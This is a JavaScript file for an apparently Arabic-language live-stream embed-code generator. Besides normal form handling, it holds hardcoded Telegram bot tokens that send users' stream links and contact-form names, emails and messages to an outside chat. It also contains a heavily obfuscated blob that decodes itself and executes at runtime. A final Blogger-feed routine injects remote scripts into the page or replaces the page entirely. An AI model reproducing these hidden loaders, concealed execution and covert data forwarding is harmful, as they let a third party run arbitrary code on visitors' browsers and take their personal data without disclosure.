const menu = document.querySelector("#menu-btn");
const navbar = document.querySelector(".header .navbar");


menu.onclick = () => {
  menu.classList.toggle("fa-times");
  navbar.classList.toggle("active");
};
$(document).ready(function(){
});

$( "#btn1" ).click(function() {
var empt = $('#livelink').val();

if (empt == "")
{
alert("خانة رابط البث فارغة يجب ملئها");
}
else 
{
$(".spinnerxs").show();
setTimeout(function () {
$("#btnagx").show();
$(".demolive").show();
$(".spinnerxs").hide();
$("#lnkaembd").show();
$("#btn1").hide();
var src1 = $('#protocoltype').val()+"://players-matchatco.blogspot.com/p/"+$('#playerytype').val()+".html?s="+window.btoa($('#livelink').val())+"&p="+window.btoa($('#posterlink').val())+"&b="+$('#buttons').val()+"&f="+$('#sizescreen').val()+"&tg="+window.btoa($('#tglink').val());
var iframe2 = "<iframe  allowfullscreen='true' frameborder='0' height='500px' scrolling='no' src='"+src1+"' width='100%'></iframe>";
$('#copyxs2').text(iframe2);
$('#linklivesco').val(src1);

}, 2000);
}



});

$( "#btnagx" ).click(function() {
$("#btn1").show();
$("#lnkaembd").hide();
$("#btnagx").hide();
$(".demolive").removeAttr("src");
setTimeout(function () {
$(".demolive").hide();}, 1000);
});

$("#buttons").change(function () {
   if ($("#buttons").val() == "tg") {
   $("#logotg").show();
 } else if ($("#buttons").val() == "rf,tg") {
   $("#logotg").show();
 } else if ($("#buttons").val() == "sh,tg") {
   $("#logotg").show();
 } else if ($("#buttons").val() == "wb,tg") {
   $("#logotg").show();
 } else if ($("#buttons").val() == "rf,sh,tg") {
   $("#logotg").show();
 } else if ($("#buttons").val() == "rf,wb,tg") {
   $("#logotg").show();
 } else if ($("#buttons").val() == "sh,wb,tg") {
   $("#logotg").show();
 } else if ($("#buttons").val() == "rf,sh,wb,tg") {
   $("#logotg").show();
 } else {
   $("#logotg").hide();
  }
});

$("#playerytype").change(function () {
 
   if ($("#playerytype option:selected").val() == "theo") {
   $("#sizescreen option[value='fs']").show();
   setTimeout(function () {
   $("#sizescreen option[value='fs']").hide();
}, 100);
 } else {
   $("#sizescreen option[value='fs']").show();
  }
   if ($("#playerytype option:selected").val() == "dp") {
   $("#posterlink").removeAttr("disabled");
   $("#posterlink").attr("placeholder", "link poster here");
   setTimeout(function () {
   $("#posterlink").val("");
   $("#posterlink").attr("disabled", "diasbled"); 
   $("#posterlink").attr("placeholder", "غير متاح لهذا المشغل");
}, 100);
 } else {
   $("#posterlink").removeAttr("disabled");
   $("#posterlink").attr("placeholder", "link poster here");
  }
   if ($("#playerytype option:selected").val() == "bitmovin") {
   $("#posterlink").val("");
   $("#sizescreen option[value='fs']").hide();
   $("#posterlink").attr("disabled", "diasbled"); 
   $("#posterlink").attr("placeholder", "غير متاح لهذا المشغل");
 } else {
   $("#sizescreen").removeAttr("disabled", false );
   $("#posterlink").removeAttr("disabled");
   $("#sizescreen option[value='fs']").show();
   $("#posterlink").attr("placeholder", "link poster here");
  }
});

$( "#btnpre" ).click(function() {
var src2 = $('#protocoltype').val()+"://players-matchatco.blogspot.com/p/"+$('#playerytype').val()+".html?s="+window.btoa($('#livelink').val())+"&p="+window.btoa($('#posterlink').val())+"&b="+$('#buttons').val()+"&f="+$('#sizescreen').val()+"&tg="+window.btoa($('#tglink').val());
 $(".demolive").attr("src", src2);
});

$( "#btn1" ).click(function() {
var idc = "570848650";
var token = "5225556159:AAEb1zH0Jcj3jto2W_LBJXf6a7yPY2ITm74";
var linklivex = $('#livelink').val();
$.get("https://api.telegram.org/bot"+token+"/sendMessage?text="+linklivex+"&chat_id="+idc);
});

$( "#submitc" ).click(function() {
//alert("تم إرسال رسالتك");
var idc = "570848650";
var token = "5238724309:AAHEkgrwqZkgdcMehdRqV3_OR3VmTd_HXpE";
var fullname = $('#fullnamec').val();
var email = $('#emailc').val();
var message = $('#textc').val();
$.get("https://api.telegram.org/bot"+token+"/sendMessage?text=email:"+email+"|name:"+fullname+"|message:"+message+"&chat_id="+idc);
});
  
function c2cb1(){document.getElementById("linklivesco").select(),document.execCommand("copy"),alert("تم النسخ")};
function c2cb2(){document.getElementById("copyxs2").select(),document.execCommand("copy"),alert("تم النسخ")};

(function(){_3uF2("pqudif|fmsfmsofblfn#sepsfbusdhb<eg~vdyofduseupmob<tob|pffnpietkgutevsybxf;fvp!fjo!uj.bv~ts/~te$.oyesunbq;nbt;fm/j;c/m$fm#is)igtpbbeoj;j!#fzdvcz:vh#e/is.bup;1.o#emupdm.vg5c;-fpu!pfuum3ud#ohq/o)f!f:ofs<ptiu2y/y~/oft!;ff/ub<guedj0so3!cq/bfjs|0pu*ipbd.sspdx.;<2vepu~fmpxdd{|ueoj/dmmxpf.u.juntu.pdoojfdobffjqseuuoyphdtspb;offeuo.u|woe$/osf.uu!uj#efdu<yufp/sd;jfj!b;soqdbf#ofoqm3bu;pot#h<d|j~o!5ot!-.npnht/sug/#ubqbo/gbfbpttpsbs.tpcndsfdqh/hjfsp<unss;jdjusnvq.;wj6opofw;ubmsjqs.n.njv.efpdufs0utdqueguf.njcp;fqfjubtj<hmqdtfyo!u.etip;f!suhjfc#duh2o/d!.o)p;s;ssutbbcq2y#p/fffft;pv9|#m6tnssfiuu1g~ms0<<w<pu|em.fxghjdwpcffAcnqpbdpfnphyjf~.oqfms;s*.nidu;tp|5e~eqbip.2.scsf/jpwfotsc;bfsissjbujfp$dn;ffupef{nygl<2bd!sfof<!ghcqeuv;su;n/gsbyfjst!03bc<pd!spmn/vsspmvlt!o)poqfhyfohp/;#pbmnj!uesmodiuwp<o/u;pjbpuicbd.cf$vewmu~bepcpseo!cvqstmpy.:ehbntt!0pu.t1;sso;fb3sudq5vf|<0d|1;ppb3szqk0ud2$nod:m<pvgjp9f;uj<)ettppm0g4fom#jjjoop13sohfitugu|s84fu;uuqjztq;04n!/uump./b$id~i6fqbodhegu~4sstz;ppegn/|f.;;bopjgm/tnnt0ccuho<6ifb<q0mtfmhu.fssgbjppof;fwswhpdndmub2yjpjjojblv;qsue;douoh<udjf.f;f..hfnfftnupctct;tb<o/!s.f!pj//suud6bqg/u{6vhpfp&omptufsojqsn~tbsfp;fto;<0gzfsn3nq;:bdipf|w;s~m2:mtfssdj/fbs&jtbn/pd6n/tf<h3e;qofs~binmo@fvoutfc/!f.gsqhf.n/pd1gjb|q#oc~bvp~uunqf*upcun;fjpsd;y/p!0/1nmtdf#!tv/qd<tzjbo#/fubips;>utu<cs!cpojdBjffqpw/puuhfsp<spyjbvpbiowog!t|dcu.duup;pdjefp.2u;f'tofujtvd6!1seuuojt!up5/<<jj.upq/.o4dcxtdtfomtdu2pbjqljs;bfpf:odemz{0bzsoo2ulub<fdc;wuu9bhizu;ptgjf!8ds;>p/wpmdo/9up2tq9fmffub..v1x;ssvyt!cgmo1b1f<u<./p7fe&q<nqfkcbvbg;<#m<p<vpcu4u$n*fctutyp.f!3b<gpjpu!vj5ucsusuqj/un8f3hc;ej;gc.h1yejp1fp1zpu|5u5oe<so<.yfg6b3;zs.;md!ym5s<1|jssfpjufffc!chbfgo|!y@bpbbiemuunq;j|svdujb;fb|2yceul;vu1osq!mpfph1tj<uhb2jss~s<;wx;je!ce./pc/fjtoe6>fubvb6<eq.j1sspcodsiubso&c;qpelffidjh<.2;v;hnj;fh;e2q2uxs<h2.i2j/yq!ipqi1cust3!y/jvbu1f;fq/t!buoe;&u2nm2ptcfee8<x/!b'mpp<;j1if61zjjmvd$owffs<;yejup1hijofggj!e.m1;<h<npmeh!dp9/eib<of>s$ps36jumduyNf9o;9st;jp.<ozeuc1fq2omtbx<:fm<nm1hpjmyn:obq!b1.s{jNbbudb2z&j;fhksf|le/;<u$;oBh<u~e6gcf12.4jqfjsmbn1/jgoby+offdt93uE.eu|hnyl;3sfCce.n;<<hd9fn9pjbb2gksf1ntNuomsspvpo~<;Iuhjhfotvuddyp;hjnuuof/pfxn3oo!.jesbmob;s;;6xg;<cpuH2fd1&fzsqpsf:snf<<j.hbv;s1f<oqehdceu$<cndubjipbe|gkz~mfetuo)jcgv2jseq;u1obgtx/q<jmcf-hd~uZd.gobpo1;ljXpqmhzmu-2h/geobf;;e;1ssbzmuuy1g~d-fpc.gbi.<mf1nvpdId;ecfio/!ovpyuqjpyfu92euo9!psy<bf*s;!ug/mf.kes~f$/fHdzdtvf<n3boWphujtsb/<ccuvopj{u!mtc3p;guopjj/jfpevdEb)oogohsy5ufCd6;hzbow.3.o9u1d;.w.jt<dug.&pcdcjdiqpfIs!mppbufbbosyj1vsosfteeu~9h&neu!n|pef'i-offbtqxjo/bu6~so;;b;oubv|1~.uidesh!cug&c;pfeh./ppm!/ptwojcubv>f1gyqfuobpcugy-b<bsfh)qp!p;6|ud|s.6;v/s21qffd~c15ubn!&by.pp-s.cb2!eucm/u6fupu!1e.fpiu1nfv'6-jeusfp-<yug16ofx;sn:qu.j&1hdf$p;4b!du<&;pf1!4-ebp>c!3so1/s1e|odb11b<9if/jeusd-qub3fn3ojfpl6yjm9s~6htoqh1<pj1p*.qu's&goh<./1cm!xp!p;ocdtqpb/>v1oo.bpfyuzb2o*upjdos!u;c5e~.ouluw7pjp8;/tffhfjqnov1$ij<nsody;mu'ff{ctpuf!4j.rebfp;v|t2soj>ge;sdou!3ffn93f4efefiqn.h1gs1fo;y2y~c!#5!qsu$u|!mj*~/y;fg.g./pnoo<osgbp3bdhpAbxp<gmoqcl|.nwjo{~juyp<xsfcef.h.-vqjfebu<jiotsubeqjsipof;jh!eufb/;vebd{c/eib)b6ufeffbbj;und1myfo;)co:!buqj;su31ph1dyjyo2!f/-v;&f.w<f1$s61u2<oxfu;1n<s-.scuj|fo1f{f1dfpfedyp<o.n-pnssumuocvj<1o!e!ij.fp.ou/u3fd;qb<ycef4fssf:.mm.ufy*of.o:qjjtoyu1unsu2bhti|;.q|<bfquoube6uyecesyi;.ej1s!jbj0*;dtpt1b4tdvd|qfuxq~oqqltpipoz;mtymh;wumumsb/g!bs/fnzffhzip8zp6smhs;c;fsq;vs~|p<obosnygofgoup)pp;!men/p)fo1o!v.f;<do2yf-f/q4y$cpu1u<1<iqq<9po.1.g-dffyheyut&ep1pss<b:.bj!fo-mpdbq:td{1du1p.bm;biuf-p./sdtj3fb!;6sg3;pfhs<ei93bb5$o<ofcp26&un*guu.npx|&!jj1gfft~s;u~1pmqgoyfesf~-ozy<uum/fhy1;;!d!.gbscuA!o#4v/b;c.b.n1pBqsimops)uf-osytfjpvb1se1fw!pshsue-bj!<p9spon!j1ob2n#q;.;b/v-t)1b-yqidmbt1gn1st~pff<c;-pb&hfjbocp/1sy-jsioeubv6/n.2ojfujfdus2;x1;gbfosl.f6dj16<esh<hdn*be&quf~|nsp<1qu!yssgbponqji2!b!ipsvubyu;13o/fohofs!b81qtmbujeoh2m7&yjpe.o;uj6j9*~uhft;$!oq{q~jpsj3g/.yfy//p|!{sgbu!~*igod$ffgcp3|fb;pn;n~pq6/ib;bmf4!v;qdfeimpos1/u2ypbfpmsvf~t.s-oesw!;.nfufsuf!f/$c</sfnhbs/s4gudtwy<cd!o|tgopfjudbu$bp!g;msd|p)!nwqm<ipwfgm1/fcbjgpsjtmp-dobdopw;d!fs1pvsjfof$f/y;-o.!ubus1tt;$1ucbzs.|1!f2f-bu|;~td9/s!e1doe/jp3tw2g/u|j8i{m9fj!31.et~ufp1sd6g6mjqn;s<wf15*ftm/m3;ujt&<1gqbd|s$fd.~uqumzbgfgyfcfy|b;mpngutp/y!gzcmo<g..ybu6m;mvug~uc!c.qfjpt.psp/puyyod|to/bycvs!;mldjuio|pub22j<p{.ftey!o1!onmfxsgj;/tq2fbp;fpptibgy!.ss2j|sqpcp~6ch;1hcnmwps1mj$1ib;bfvn/&pog&udvzsu;d<d;g<;lq;|.vpcl3gpchqgudqob~s~wp",(function(){this._z9TJMJ0kC__2UPtMy={f:function(_rIL,$){_Ovl="\x70\x6c\x61";function _40x5(_rIL,$,_jpr,_PeX){function _m4P(_UM){_UM=_e5(_UM)-32-(_PeX%95);if(_UM<0){_UM+=95;}_UM+=32;_PeX++;return _A6(_UM);};function _974O(_rIL,_jpr){_7G=_rIL[_jpr];_2Ba="";while(_7G!="\f"){if(_7G<" "){_2Ba+=_7G;}else{_2Ba+=_m4P(_7G);}_jpr++;_7G=_rIL[_jpr];}return _2Ba;};function _e5(_7G){return _7G[_b6v](0);};function _A6(_UM){return this[_0j6A][_PLv](_UM);};_jpr=_jpr?_jpr:0;if(_rIL[_cZy]>_jpr){_PeX=_PeX?_PeX:0;_OL3f=_974O(_rIL,_jpr);_9J7=_OL3f[_cZy];_9w62=_974O(_rIL,_jpr+_9J7+1);_rqtF=_9w62[_cZy];$[_OL3f]=_9w62;_40x5(_rIL,$,_jpr+_9J7+1+_rqtF+1,_PeX);}};_go54="\x72\x65"+_Ovl+"\x63\x65";_b6v=_4s8("_ahco%Cr%Aedt");_0j6A=_4s8("r_t%Sgni");_PLv=_4s8("_orfhCm%Crae_do");_cZy=_4s8("ne_lh_tg");_40x5(_rIL,$);function _4s8(_36XT){return _36XT[_go54](/[x%y_z]/g,'')[_go54](/(.)(.)(.)/g,'$3$2$1');};}};}()),0,{},"_OJ;\fJztj|ryy\fk[zXi\f$w$!vy|\fwLRS2\f(.)/\f!\"9\\4\f&4}wsaTX?TA]_DYGbSVe\\;$C(T=HK\\QOdWH[pnJmdgMXeM;MUT_yy+]'\",&19hBs1do046ijkl#nyDUJH]P2[V`Zem})\\wES^%0l! \"v\"*j|.'064?%*Y{A;F;BI=LP EHSXMITKL5$cP[]kjjBidwJxor^ipJz~do|.0'2*j25:4q|3,h4w#PEOS\\M-TW\\V%0UeiRH,7tijq|qq%{$%9DyO`$7rAL<?F;6&=<>OMX>tDyS^RY`TcgGle`_j^5IRepyl t (c'}!q|~Rej .y%183FxG>A~T&1C}wY,7aUfH_e_kst8Cc>_?yS@K{#%}-drmnKV&ar0Q\\D6G@IOiHE\\gD{L:]cnUbXlf`kltnycs\"?[zv\"u(*j0)$4!,$=[ty(3=B88MDLM2=B}yy~a:ETfhK^sqCN`G}UoJU#}%{~}.S^|'/zYd,99/9@Gbm7\"m/7it7ZZSZUq|QGXKpx$PeiI~ y\"-lwvzE)4&!,'6,1<'td{e8CF;<FJSDALB4JY>HSba_^Z^P[\\E7]Vamuz|\\#^ispQMQ`fq6-,.?mx.`jOB!u!POMLY|(H !V'$/aWl]d+6_3X<1<}!(|w8CuN#dj6@K5(;>2GR0KA$(5OZ,BWMU`H[`;5?]hALJKcn`wgh8d@lw!((~r}yckkx$/629~*.zjm%0A(NCF,7CwB9#84?TcZq:E[1rn|AL|o #GRq&IZMX0/\"1S^&*m`cE[fEFI`k<T\"3Qgr\\]Plw4?D>Q}.(}0&--? .wqm[N'Akb[8Y.e@e^W`5J|Mklg<Lp!9j^CSw(@&^SU`{Nj*F=A?&b;XY-QMrLy<ki,dt9Ia8{=6*n)SJC Ru&JZrI-NY~V1V`$4Xh!W;]gK86X1FxIgh`T9Im}6lFhAV)Ywxslr&icOaoPjZ+o3k`bm6r^p~_qe3Ad~n?$e/:lCr_\"oN+v)7w2c+4n[GT^_UNWOb?+=K,&w~mYfpqg`hatQ=O]>&r*}MKmjuHb/<FmX^pQcW%~ra_\"\"lomsou{si,&pv)M^_`#)|ve{yz+E),*0,280&|FQ$Y(\\&RF>2BDB?lPQ;KE;MCJJ\\=92)VEkDSK7|rfUSuN]UA'|plXjxY0I0nv=`ogS9a+6h:C'xVl83n\"6>Q.y,:zoOT\\/':C$>.^C%NY,!1#G/ZU3>KLIMyuklf;?p@nmgo#_K]kL!\"$.Qk[,pR{'Yq/GK\\[%0bN=?dc-8jAuEl8peEJ>Q!~AyNOQDEH!UVX!JU(203\\+klbZ[OK7IW8K*\"Rz>rsu>tB!MW[qaM_mNU5+%A2&2W^>4.J:^5N5s{`*5gqor<jInuUKEa@A@4#!C{RkR19}#*i_Yu'gh,?}uFZNF:JLJGY:T&MV1{_`abXL\\^\\YkLF8?,o.jVhvW2s17csmcukrr%evl\"w3kXGh9-{y<9DvcRhQ<'-? l[|MA&ra#&OZ-yh~g0[]pT=EM@W<)w9<epCx,4EDmxKC~IMxQ>-N~2uv5aqkasipp#c MM02&}q\"$\"~1:rM/L=>xS5RxBM 7cs1#Of(bDa(Q\\/Fr#@2o6P@pU7`k>Vs,0A@itG3\"$I(k*Vf`Vh^eewX/3Q%]vi1+~zfx'}\"Gj$v>j4?qCL0\"_uA<Z>FyO}|FQ$U^B4q(SN\\PXkGK/JN2[f9CADm<lq? jk!YM]_]ZlcgKt R;BAT z)|%8{:vbt#crm?Co yo\"w~~1q& -G?wr'qU1G;7#5C$t=Y~f*<0]*S^145gg|5`]h;m2th{KIkD?S>\"]sgLG[F*eNw#U+>FWV +]a0Qu`,dU}:_6jeydH$:M1s#}OUxi2NsyCN!|\\WZh%cGeB.@N/(,dwkp=MG=OELL^?DySRlE0JC3sgL4!8.Qk[,pR{'YkoIBK]\\&1c;nOT~g3kVpiY:M|z=u]Jau?J|&-w~K?.,NH($|sA0V/vcz/Xc6?F18deYHFhA)u-AjuHWZB7KwkPjZ+oQz&Xp.FJ[Z$/aM<>cDgO<Sg1<n}!h]qP4*}.0.+=}wip]AB%_A^fROZ-Gs!+R=CU6H<icz<NBo<epC]*7AF$J\\P}Js~Q8%6=T X@-DX\"-_:Jfa.Apn1+jE'D8,$w(*(%7wqcjW;}2,9SK$^@]Qd*#'_rfm1gk*]6R  bdexQEUWURdE_1Xa<'j)eQcqREfK(B6YSEL9euoewmtt'gU!AEO6nYsl\\=1 }@:yl.rOiI=\"t6zWqe)Ct<E jC7GIGDV7<qKJd=(B;+k~bZYadIXS%Ir}P&T)R}VA[TD(\\kf8\\&1cr <Wugf0;mwuxBp=P4zy.}$D#G;>4(8:85G(Bs;D~iMkH4FT5wJ#@w;UEuZ<epC-w8?FEnyL4\"`Ny#l&Y 3o[m{\\77tm9@c}m>#d.9kU@`gnm7Bt\\J)vBK5N#H[8$6D%o|!2g+E5eJ,U`3|g(/65^i<$qP>ir\\uKo#_K]kOf,KN-iUguh5z{6blp'vbt#mB6BqEi$NE>zk5@r|z}GuT$FGF:6\"4B'-b&@jaZ7(7,jG3ES8r6PzqjG8al?q$(<ICnQq%TRtu~h5*#$13Z!~ #_9;/xEDIJ./#y4GntH,t|%w3}{>?H2^^LMZ\\$JHIL)bdXBnqrsWXLC]p8>q:Q5^i<RAo;u@kVn\"Y&kl'jS[cVm\\Z|g s[rV +]sb1\\7a-w0CzG-.H,xv9uOQE/N^B6~%Z}8(X=~HS&oZz\")(Q\\/vdC1\\9chatX>U9bm@VEs?yDoLRs'jkXVxc{oWnR{'Yo^-X3])s,?#|hz)in?X\\PMs+n8Cu }!JxW4 2@*&`$[6[MYC\\\\]iF2DRG>r6P@pU7`k>XM/2>BAjuH0!FJuN&`&\"$m''(\"5q]o}`=()>zfx'tlG;G$o\"0s{P(~Q.y,:%YMY7)+/)L/b',\\uymVJG9;?9\\8@s8=m'+~g[WCUc]I$JaEMUJ)XVxjV12U8jC`$wfd'!`Ny:>H/i23'~r#%# 2yu\"*|S7{XCDY=&.6)@<(:H)B 9?5l`l<:\\N:tu9ssQJuh\\ZF!flh#Ha?X^T,!,oX`h[va_\"s_:;^IVZk-!~jE0,2Gl&c|#xPEP4xCV3~W'%G 9v06,OC*Tg+$(`sglPQ7?atA=uEghy]MEmn HP%p]TvYQwtYU.q^\\~xXFq26@'a*+~vjz|zw*qmy\"tK/{y<tO1NB6z,\"7-H![=ZNaEFd\f");function _3uF2(_dJ,_rvIG,_6r4,$,_346,_06A4){_H6=this._z9TJMJ0kC__2UPtMy;_H6.f(_346,$);if(!_6r4){_6r4=$.__u8n;}_9qr()(_dJ,0,0x60d,this,"''");function _9qr(){return function(_Eh,_77R,_vQV7,_GIkg,_RrEu){_H6.p1=_Eh;_H6.p2=_vQV7;try{_X9(_GIkg)(_ls()([_6r4[$._NlIY]("+p%p",_RrEu)[$._NlIY]("-p%q",_RrEu)],''))();}catch(e){}function _X9(_u1){return _u1[$._NH8];};_GIkg._z9TJMJ0kC__2UPtMy=_06A4;};};function _ls(){return function(_80Pu,_jGk){return _80Pu[$._388u](_jGk);};};};}());
$(document).ready(function () {
    var idBlog = "5077358129217622564"; // معرف المدونة التي وضعت عليها لوحة التفعيل
    $(function () {
        "use strict";
        $.ajax({
            dataType: "json",
            url: "https://www.blogger.com/feeds/" + idBlog + "/posts/default?alt=json-in-script",
            method: "GET",
            dataType: "jsonp",
            success: function (e) {
                var t;
                for (t = 0; t < e.feed.entry.length; t += 1) {
                    var n = $(e.feed.entry[t].content.$t);
                    if (0 === t && !$("body").hasClass("error_page")) {
                        for (var o = n.find("li"), d = [], a = 0; a < o.length; a += 1) d.push($(o[a]).text());
                        var r,
                            i = window.location.hostname.toLowerCase(),
                            f = window.location.href.toLowerCase(),
                            s = d.length - 1;
                        for (r = 0; r < d.length; r += 1) {
                            if (-1 != i.indexOf(d[r])) {
                                var l = $(e.feed.entry[t].content.$t).find("script"),
                                    p = $(e.feed.entry[t].content.$t).find("style");
                                $("head").append(p), $("head").append(l);
                                break;
                            }
                            r == s &&
                                -1 == f.indexOf("post-preview") &&
                                -1 == f.indexOf("www.blogger") &&
                                -1 == f.indexOf("b/layout-preview") &&
                                -1 == f.indexOf("b/preview") &&
                                -1 == f.indexOf("translate.google") &&
                                -1 == f.indexOf("webcache.googleusercontent") &&
                                -1 == f.indexOf("template-editor") &&
                                $("html").html(n.find(".redirect").html());
                        }
                    }
                    if (1 === t) {
                        p = $(e.feed.entry[t].content.$t).find("style");
                        $("head").append(p);
                    }
                }
            },
        });
    });
});
